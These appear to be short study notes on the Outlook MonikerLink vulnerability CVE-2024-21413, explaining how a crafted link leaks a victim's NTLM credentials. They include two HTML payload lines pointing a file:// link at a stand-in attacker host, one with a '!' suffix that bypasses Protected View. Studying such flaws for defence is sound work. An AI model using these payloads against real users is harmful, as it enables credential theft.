AKA CVE-2024-21413

https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413

Using this Outlook vulnerability, an attacker can send a hyperlink (Moniker Link). If the user clicks it, Outlook sends the user's NTLM credentials to the attacker

RCE (Remote Code Execution) is also possible using Moniker Link

Moniker Link: not a classical URL pointing to a website, but a link in Microsoft Office, telling Office to use built-in "moniker provider" to handle the link

The link is then hidden under seemingly legitimate buttons / display text (using CTRL+K or HTML code)
*Example*: 
```html
<a href="file://ATTACKER_IP/test">Click me</a>
```
This would be picked up by Outlook's Protected View

Protected View can be bypassed by including a "!" and some text:
```html
<a href="file://ATTACKER_MACHINE/test!exploit">Click me</a>
```

The share doesn't need to exist on the remote device!
An authentication attempt will occur regardless, leading to the victim's Windows netNTLMv2 hash being sent to the attacker
